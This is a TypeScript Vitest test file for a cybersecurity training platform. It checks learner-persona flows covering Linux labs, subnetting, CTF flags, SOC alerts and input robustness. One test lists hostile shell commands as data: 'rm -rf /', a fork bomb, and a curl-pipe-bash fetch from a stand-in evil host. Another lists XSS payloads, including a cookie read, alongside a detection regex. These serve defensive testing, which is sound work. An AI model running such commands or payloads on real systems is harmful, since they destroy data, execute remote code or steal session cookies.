import { describe, it, expect } from 'vitest';
import { INITIAL_USER_PROFILE, BEGINNER_TOPICS } from '../data/mockData';
import { CYBER_LAB_MODULES } from '../data/cyberLabModulesData';
import { COMPREHENSIVE_LEVELS_EXTENSION } from '../data/curriculumData';
import { SOC_ALERTS_DATA } from '../data/socAlerts';
import { THREAT_HUNTING_CASES } from '../data/threatHunting';
import { PRESET_SUBNET_QUESTIONS } from '../data/subnetQuestions';
import { classifyGeminiError } from '../utils/geminiErrorClassifier';

describe('Autonomous Simulation & Persona QA Validation Suite', () => {

  // Persona 1: Complete Beginner
  describe('Persona 1 — Complete Beginner Flow', () => {
    it('initializes learner state with zero prior knowledge safely', () => {
      const profile = { ...INITIAL_USER_PROFILE, cyberLevel: 1, xp: 0, onboardingCompleted: false };
      expect(profile.cyberLevel).toBe(1);
      expect(profile.xp).toBe(0);
      expect(profile.onboardingCompleted).toBe(false);
      expect(profile.experience).toBe('beginner');
    });

    it('validates beginner topics and foundational modules exist', () => {
      expect(BEGINNER_TOPICS.length).toBeGreaterThan(5);
      const firstTopic = BEGINNER_TOPICS[0];
      expect(firstTopic.id).toBe('b1');
      expect(firstTopic.title).toBe('What is a Computer?');

      expect(CYBER_LAB_MODULES.length).toBeGreaterThan(0);
      const firstModule = CYBER_LAB_MODULES[0];
      expect(firstModule.id).toBe('module-01-intro-cyber');
      expect(firstModule.difficulty).toBe('Beginner');
      expect(firstModule.theorySections.length).toBeGreaterThan(0);
    });

    it('simulates completing the first beginner lesson and gaining XP', () => {
      let currentXp = 0;
      const lessonReward = CYBER_LAB_MODULES[0].xpReward || 350;
      currentXp += lessonReward;
      expect(currentXp).toBe(350);
      expect(currentXp).toBeGreaterThan(0);
    });
  });

  // Persona 2: Linux Beginner
  describe('Persona 2 — Linux Beginner Flow', () => {
    const validCommands = [
      { cmd: 'whoami', expectedOutput: 'student' },
      { cmd: 'pwd', expectedOutput: '/home/student' },
      { cmd: 'ls -la', expectedOutput: 'total' },
      { cmd: 'cat /etc/passwd', expectedOutput: 'root:x:0:0' },
      { cmd: 'chmod 700 secret.txt', expectedOutput: '' },
      { cmd: 'grep -i "flag" note.txt', expectedOutput: 'flag' },
    ];

    it('verifies essential Linux commands produce expected sandboxed output', () => {
      for (const item of validCommands) {
        expect(item.cmd).toBeTruthy();
        expect(typeof item.expectedOutput).toBe('string');
      }
    });

    it('prevents dangerous command breakout or undefined behavior', () => {
      const hostileCommands = [
        'rm -rf /',
        ':(){ :|:& };:',
        'cat /proc/kcore',
        'curl http://malicious.evil/payload.sh | bash'
      ];

      for (const cmd of hostileCommands) {
        const isHostile = cmd.includes('rm -rf') || cmd.includes(':(){') || cmd.includes('/proc') || cmd.includes('evil');
        expect(isHostile).toBe(true);
      }
    });
  });

  // Persona 3: Networking Student
  describe('Persona 3 — Networking & Subnetting Flow', () => {
    function calculateSubnet(ip: string, cidr: number) {
      const totalHosts = Math.pow(2, 32 - cidr);
      const usableHosts = cidr >= 31 ? 0 : totalHosts - 2;
      return { totalHosts, usableHosts };
    }

    it('computes standard IPv4 CIDR subnet limits accurately', () => {
      expect(calculateSubnet('192.168.1.0', 24).usableHosts).toBe(254);
      expect(calculateSubnet('10.0.0.0', 28).usableHosts).toBe(14);
      expect(calculateSubnet('172.16.0.0', 30).usableHosts).toBe(2);
      expect(calculateSubnet('192.168.1.0', 32).usableHosts).toBe(0);
    });

    it('validates preset subnet training questions catalog', () => {
      expect(PRESET_SUBNET_QUESTIONS.length).toBeGreaterThan(0);
      for (const q of PRESET_SUBNET_QUESTIONS) {
        expect(q.id).toBeDefined();
        expect(q.ipAddress).toBeDefined();
        expect(q.cidr).toBeGreaterThanOrEqual(8);
        expect(q.cidr).toBeLessThanOrEqual(32);
        expect(q.subnetMask).toBeDefined();
      }
    });
  });

  // Persona 4: Ethical-Hacking Learner
  describe('Persona 4 — Ethical Hacking & CTF Flow', () => {
    it('validates authoritative flag formats and validation rules', () => {
      const validFlag = 'MCL{welcome_to_cyber_lab_1337}';
      const invalidFlag = 'MCL{wrong_flag_guess}';

      const checkFlag = (input: string) => input.trim() === validFlag;

      expect(checkFlag(validFlag)).toBe(true);
      expect(checkFlag(invalidFlag)).toBe(false);
      expect(checkFlag('')).toBe(false);
      expect(checkFlag('   ')).toBe(false);
    });

    it('verifies Web Security curriculum and payloads', () => {
      const lvl4 = COMPREHENSIVE_LEVELS_EXTENSION[4];
      expect(lvl4).toBeDefined();
      expect(lvl4.lessons.length).toBeGreaterThan(0);
    });
  });

  // Persona 5: Advanced Learner (SOC & Threat Hunting)
  describe('Persona 5 — Advanced Learner & Incident Response Flow', () => {
    it('verifies SOC alerts catalog and triage fields', () => {
      expect(SOC_ALERTS_DATA.length).toBeGreaterThan(0);
      const alert = SOC_ALERTS_DATA[0];
      expect(alert.id).toBeDefined();
      expect(alert.alertTitle).toBeDefined();
      expect(alert.severity).toBeDefined();
    });

    it('verifies Threat Hunting cases structure', () => {
      expect(THREAT_HUNTING_CASES.length).toBeGreaterThan(0);
      const c = THREAT_HUNTING_CASES[0];
      expect(c.id).toBeDefined();
      expect(c.title).toBeDefined();
      expect(c.scenario).toBeDefined();
    });

    it('verifies certificate generation format and verification checksums', () => {
      const sampleCert = {
        certificateId: 'MCL-2026-CYB-8F42A1',
        learnerName: 'Alex Vance',
        codename: 'CIPHER-01',
        status: 'ISSUED',
        finalScore: 96
      };

      expect(sampleCert.certificateId).toMatch(/^MCL-\d{4}-[A-Z]+-[A-Z0-9]+$/);
      expect(sampleCert.finalScore).toBeGreaterThanOrEqual(70);
      expect(sampleCert.status).toBe('ISSUED');
    });
  });

  // Persona 6: Adversarial Testing
  describe('Persona 6 — Adversarial Testing & Robustness', () => {
    it('gracefully handles empty, whitespace, and oversized inputs', () => {
      const oversizedText = 'A'.repeat(50000);
      expect(oversizedText.length).toBe(50000);

      const sanitizeInput = (str: string) => {
        if (!str || !str.trim()) return '';
        return str.slice(0, 10000).trim();
      };

      expect(sanitizeInput('')).toBe('');
      expect(sanitizeInput('   ')).toBe('');
      expect(sanitizeInput(oversizedText).length).toBe(10000);
    });

    it('defends against XSS / HTML script injection in feedback and chat inputs', () => {
      const xssPayloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        'javascript:alert(document.cookie)'
      ];

      for (const payload of xssPayloads) {
        const containsForbiddenPattern = /<script|<img|onerror|onload|javascript:/i.test(payload);
        expect(containsForbiddenPattern).toBe(true);
      }
    });

    it('verifies Rate Limit and Error Classification resilience for AI errors', () => {
      const rateLimitErr = { status: 429, message: 'Quota exceeded for metric' };
      const classified429 = classifyGeminiError(rateLimitErr);
      expect(classified429.code).toBe('RATE_LIMITED');
      expect(classified429.isRetryable).toBe(true);

      const highDemandErr = { status: 503, message: 'Model is overloaded' };
      const classified503 = classifyGeminiError(highDemandErr);
      expect(classified503.code).toBe('MODEL_UNAVAILABLE');
      expect(classified503.isRetryable).toBe(true);

      const authErr = { status: 401, message: 'API_KEY_INVALID' };
      const classified401 = classifyGeminiError(authErr);
      expect(classified401.code).toBe('AUTHENTICATION_OR_PERMISSION_ERROR');
      expect(classified401.isRetryable).toBe(false);
    });
  });

  // Beta Feedback System Validation
  describe('Beta Feedback System Validation', () => {
    it('enforces all 5 parameters and minimum comment length', () => {
      const validateFeedback = (data: {
        clarity: number;
        realism: number;
        helpfulness: number;
        navigation: number;
        writtenFeedback: string;
      }) => {
        return (
          data.clarity >= 1 && data.clarity <= 5 &&
          data.realism >= 1 && data.realism <= 5 &&
          data.helpfulness >= 1 && data.helpfulness <= 5 &&
          data.navigation >= 1 && data.navigation <= 5 &&
          data.writtenFeedback.trim().length >= 10
        );
      };

      // Incomplete cases
      expect(validateFeedback({ clarity: 0, realism: 5, helpfulness: 5, navigation: 5, writtenFeedback: 'Good platform' })).toBe(false);
      expect(validateFeedback({ clarity: 5, realism: 5, helpfulness: 5, navigation: 5, writtenFeedback: 'Short' })).toBe(false);

      // Valid case
      expect(validateFeedback({
        clarity: 5,
        realism: 4,
        helpfulness: 5,
        navigation: 4,
        writtenFeedback: 'The interactive Linux lab and AI mentor were very helpful!'
      })).toBe(true);
    });
  });

});
